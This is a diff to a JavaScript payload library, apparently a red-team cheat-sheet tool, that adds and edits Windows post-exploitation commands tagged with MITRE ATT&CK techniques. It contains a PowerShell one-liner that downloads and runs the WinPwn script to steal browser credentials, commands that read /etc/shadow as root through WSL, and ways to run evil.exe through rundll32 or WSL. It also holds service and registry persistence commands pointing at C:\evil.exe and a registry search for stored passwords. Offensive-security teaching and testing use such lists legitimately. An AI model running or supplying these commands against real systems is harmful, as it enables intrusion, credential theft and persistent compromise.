@@ -348,7 +348,7 @@ const PAYLOADS = {
             'desc': 'The command copies the registry hives to each file using Volume Shadow Copies (vss).',
         },
         'PowerShell (WinPwn)': {
-            'cmd': 'IEW(New-Object Net.Webclient).DownloadString(\'https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/WinPwn.ps1\');Kittielocal -noninteractive -browsercredentials',
+            'cmd': 'iex(New-Object Net.Webclient).DownloadString(\'https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/WinPwn.ps1\');Kittielocal -noninteractive -browsercredentials',
             'cli': 'PowerShell',
             'adminRequired': false,
             'mitre': {'id': 'T1555.003', 'url': 'https://attack.mitre.org/techniques/T1555/003/'},
@@ -363,7 +363,7 @@ const PAYLOADS = {
             'lolbas': null,
             'desc': 'The command saves the LSA secrets to arbitrary file. The file can be extracted using some tool such as Mimikatz.',
         },
-        'Reg (Enumerate Credentials)': {
+        'Reg (Find Credentials)': {
             'cmd': 'reg query HKLM /f password /t REG_SZ /s',
             'cli': null,
             'adminRequired': false,
@@ -643,6 +643,14 @@ const PAYLOADS = {
             'lolbas': null,
             'desc': 'The command enumerates firewall rules.',
         },
+        'PowerShell (Get-NetIPConfiguration': {
+            'cmd': 'Get-NetIPConfiguration',
+            'cli': 'PowerShell',
+            'adminRequired': false,
+            'mitre': {'id': 'T1016', 'url': 'https://attack.mitre.org/techniques/T1016/'},
+            'lolbas': null,
+            'desc': 'The command enumerates network configurations.',
+        },
         'PowerShell (Get-SmbShare)': {
             'cmd': 'Get-SmbShare',
             'cli': 'PowerShell',
@@ -658,6 +666,14 @@ const PAYLOADS = {
             'mitre': {'id': 'T1016', 'url': 'https://attack.mitre.org/techniques/T1016/'},
             'lolbas': null,
             'desc': 'The command enumerates network adapter and interface information.',
+        },
+        'Type (hosts)': {
+            'cmd': 'type C:\\Windows\\System32\\drivers\\etc\\hosts',
+            'cli': null,
+            'adminRequired': false,
+            'mitre': {'id': 'T1016', 'url': 'https://attack.mitre.org/techniques/T1016/'},
+            'lolbas': null,
+            'desc': 'The command displays the contents of the HOSTS file that contains network configurations.',
         },
     },
     'Enumerate Processes': {
@@ -703,8 +719,40 @@ const PAYLOADS = {
             'lolbas': null,
             'desc': 'The command enumerates started services.',
         },
+        'PowerShell (Get-Service)': {
+            'cmd': 'Get-Service | Where-Object {$_.Status -eq "Running"}',
+            'cli': 'PowerShell',
+            'adminRequired': false,
+            'mitre': {'id': 'T1007', 'url': 'https://attack.mitre.org/techniques/T1007/'},
+            'lolbas': null,
+            'desc': 'The command enumerates running services.',
+        },
+        'Sc': {
+            'cmd': 'sc query',
+            'cli': null,
+            'adminRequired': false,
+            'mitre': {'id': 'T1007', 'url': 'https://attack.mitre.org/techniques/T1007/'},
+            'lolbas': null,
+            'desc': 'The command enumerates system services.',
+        },
+        'Wmic': {
+            'cmd': 'wmic service list brief',
+            'cli': null,
+            'adminRequired': false,
+            'mitre': {'id': 'T1007', 'url': 'https://attack.mitre.org/techniques/T1007/'},
+            'lolbas': null,
+            'desc': 'The command enumerates services.',
+        },
     },
     'Enumerate System': {
+        'Dir (Env)': {
+            'cmd': 'dir env:',
+            'cli': 'PowerShell',
+            'adminRequired': false,
+            'mitre': null,
+            'lolbas': null,
+            'desc': 'The command enumerates environment variables.',
+        },
         'Driverquery': {
             'cmd': 'driverquery /v /fo list;driverquery /si /fo list',
             'cli': null,
@@ -737,13 +785,29 @@ const PAYLOADS = {
             'lolbas': null,
             'desc': 'The command displays the system time on the target computer.',
         },
-        'PowerShell (Get-CimInstance)': {
+        'PowerShell (Get-ChildItem, Env)': {
+            'cmd': 'Get-ChildItem Env:',
+            'cli': 'PowerShell',
+            'adminRequired': false,
+            'mitre': null,
+            'lolbas': null,
+            'desc': 'The command enumerates environment variables.',
+        },
+        'PowerShell (Get-CimInstance, PnP)': {
             'cmd': 'Get-CimInstance -Query "SELECT * FROM Win32_PnPEntity WHERE (PNPClass = \'Image\' OR PNPClass = \'Camera\')"',
             'cli': 'PowerShell',
             'adminRequired': false,
             'mitre': {'id': 'T1082', 'url': 'https://attack.mitre.org/techniques/T1082/'},
             'lolbas': null,
             'desc': 'The command enumerates information of PlugNPlay camera.',
+        },
+        'PowerShell (Get-CimInstance, SerialNumber)': {
+            'cmd': '(Get-CimInstance -Classname Win32_BIOS -Property SerialNumber).SerialNumber',
+            'cli': 'PowerShell',
+            'adminRequired': false,
+            'mitre': {'id': 'T1082', 'url': 'https://attack.mitre.org/techniques/T1082/'},
+            'lolbas': null,
+            'desc': 'The command displays the serial number.',
         },
         'PowerShell (Get-ComputerInfo)': {
             'cmd': 'Get-ComputerInfo',
@@ -761,6 +825,22 @@ const PAYLOADS = {
             'lolbas': null,
             'desc': 'The command displays the system time.',
         },
+        'PowerShell (Get-HotFix)': {
+            'cmd': 'Get-HotFix -description "Security update"',
+            'cli': 'PowerShell',
+            'adminRequired': false,
+            'mitre': {'id': 'T1082', 'url': 'https://attack.mitre.org/techniques/T1082/'},
+            'lolbas': null,
+            'desc': 'The command enumerates patches. We may find vulnerabilities (https://msrc.microsoft.com/update-guide/vulnerability) from the information.',
+        },
+        'PowerShell (Get-PSDrive)': {
+            'cmd': 'Get-PSDrive',
+            'cli': 'PowerShell',
+            'adminRequired': false,
+            'mitre': {'id': 'T1082', 'url': 'https://attack.mitre.org/techniques/T1082/'},
+            'lolbas': null,
+            'desc': 'The command enumerates connected devices.',
+        },
         'PowerShell (Reg)': {
             'cmd': 'reg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\Nls\\Language',
             'cli': 'PowerShell',
@@ -769,13 +849,13 @@ const PAYLOADS = {
             'lolbas': null,
             'desc': 'The command displays the system language.',
         },
-        'Sc': {
-            'cmd': 'sc query',
+        'Set': {
+            'cmd': 'cmd /c set',
             'cli': null,
             'adminRequired': false,
-            'mitre': {'id': 'T1007', 'url': 'https://attack.mitre.org/techniques/T1007/'},
+            'mitre': null,
             'lolbas': null,
-            'desc': 'The command enumerates system services.',
+            'desc': 'The command enumerates environment variables.',
         },
         'Systeminfo': {
             'cmd': 'systeminfo',
@@ -809,9 +889,35 @@ const PAYLOADS = {
             'lolbas': null,
             'desc': 'The command enumerates OS information.',
         },
+        'Wmic (qfe)': {
+            'cmd': 'wmic qfe get Caption,Description,HotFixID,InstalledOn',
+            'cli': null,
+            'adminRequired': false,
+            'mitre': {'id': 'T1082', 'url': 'https://attack.mitre.org/techniques/T1082/'},
+            'lolbas': null,
+            'desc': 'The command enumerates patches. We may find vulnerabilities (https://msrc.microsoft.com/update-guide/vulnerability) from the information.',
+        },
+    },
+    'Enumerate WSL': {
+        'Wsl': {
+            'cmd': 'wsl -e cat /etc/passwd',
+            'cli': null,
+            'adminRequired': false,
+            'mitre': {'id': 'T1202', 'url': 'https://attack.mitre.org/techniques/T1202/'},
+            'lolbas': null,
+            'desc': 'We can operate WSL via \'wsl.exe\' command.',
+        },
+        'Wsl (Root privilege)': {
+            'cmd': 'wsl -u root -e cat /etc/shadow',
+            'cli': null,
+            'adminRequired': false,
+            'mitre': {'id': 'T1202', 'url': 'https://attack.mitre.org/techniques/T1202/'},
+            'lolbas': 'https://lolbas-project.github.io/lolbas/OtherMSBinaries/Wsl/',
+            'desc': 'The command operates WSL as root user.',
+        },
     },
     'Evade Debuggers': {
-        'PowerShell': {
+        'PowerShell (Get-Process)': {
             'cmd': 'Get-Process | Where-Object { $_.ProcessName -match "dbg" -or $_.ProcessName -match "debug" }',
             'cli': 'PowerShell',
             'adminRequired': false,
@@ -920,6 +1026,14 @@ const PAYLOADS = {
             'mitre': {'id': 'T1218.011', 'url': 'https://attack.mitre.org/techniques/T1218/011/'},
             'lolbas': 'https://lolbas-project.github.io/lolbas/Libraries/Shell32/',
             'desc': null,
+        },
+        'Wsl': {
+            'cmd': 'wsl cmd.exe /c whoami',
+            'cli': null,
+            'adminRequired': false,
+            'mitre': {'id': 'T1202', 'url': 'https://attack.mitre.org/techniques/T1202/'},
+            'lolbas': null,
+            'desc': 'The command executes arbitrary command via WSL. Note that the WSL needs to be enabled in the target system.',
         },
     },
     'Execute DLL': {
@@ -1046,7 +1160,7 @@ const PAYLOADS = {
             'desc': null,
         },
         'Rundll32 (Shell32)': {
-            'cmd': 'rundll32 shell32.dll,ShellExec_RunDLL evil.exe',
+            'cmd': 'rundll32 shell32.dll,ShellExec_RunDLL C:\\evil.exe',
             'cli': null,
             'adminRequired': false,
             'mitre': {'id': 'T1218.011', 'url': 'https://attack.mitre.org/techniques/T1218/011/'},
@@ -1068,6 +1182,14 @@ const PAYLOADS = {
             'mitre': {'id': 'T1564.004', 'url': 'https://attack.mitre.org/techniques/T1564/004/'},
             'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Wmic/',
             'desc': null,
+        },
+        'Wsl': {
+            'cmd': 'wsl /mnt/c/Users/Public/Desktop/evil.exe',
+            'cli': null,
+            'adminRequired': false,
+            'mitre': {'id': 'T1202', 'url': 'https://attack.mitre.org/techniques/T1202/'},
+            'lolbas': null,
+            'desc': 'The command executes a PE file via WSL. Note that the WSL needs to be enabled in the target system.',
         },
     },
     'Execute JavaScript': {
@@ -1286,6 +1408,16 @@ const PAYLOADS = {
             'desc': 'The command resets a file/directory permission to allow the current user to own.',
         },
     },
+    'Monitor Clipboard': {
+        'PowerShell (Get-Clipboard)': {
+            'cmd': 'Get-Clipboard',
+            'cli': 'PowerShell',
+            'adminRequired': false,
+            'mitre': {'id': 'T1115', 'url': 'https://attack.mitre.org/techniques/T1115/'},
+            'lolbas': null,
+            'desc': 'The command displays the contents of the clipboard.',
+        },
+    },
     'Obfuscate': {
         'Certutil': {
             'cmd': 'certutil -encode evil.exe evil_enc.exe',
@@ -1329,6 +1461,13 @@ const PAYLOADS = {
             'lolbas': null,
             'desc': 'The command hijacks the MruPidList COM object to execute the evil.dll for persistence. To delete it, run \'reg delete "HKCU\\Software\\Classes\\CLSID\\{42aedc87-2188-41fd-b9a3-0c966feabec1}"\' command.',
         },
+        'Reg (Service)': {
+            'cmd': 'reg add HKLM\\System\\CurrentControlSet\\Services\\<ExampleService> /v imagePath /t REG_EXPAND_SZ /d "C:\\evil.exe" /f',
+            'cli': null,
+            'adminRequired': true,
+            'mitre': {'id': 'T1112', 'url': 'https://attack.mitre.org/techniques/T1112/'},
+            'desc': 'The command modifies the image path of the service. Replace the \'<ExampleService>\' in the registry path with your target.',
+        },
         'Reg (Recycle Bin)': {
             'cmd': 'reg add "HKCR\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\shell\\open\\command" /ve /d "C:\\evil.exe" /f',
             'cli': 'PowerShell',
@@ -1361,7 +1500,15 @@ const PAYLOADS = {
             'lolbas': null,
             'desc': 'The command makes the evil.exe to be executed when logon.',
         },
-        'Sc': {
+        'Sc (Config)': {
+            'cmd': 'sc config "Service Name" binPath= "C:\\evil.exe"',
+            'cli': null,
+            'adminRequired': true,
+            'mitre': {'id': 'T1569.002', 'url': 'https://attack.mitre.org/techniques/T1569/002/'},
+            'lolbas': null,
+            'desc': 'The command modifies the binary path of the existing service. It may achieve persistence.',
+        },
+        'Sc (Create)': {
             'cmd': 'sc create Evil binPath="C:\\evil.exe" start= auto',
             'cli': null,
             'adminRequired': true,
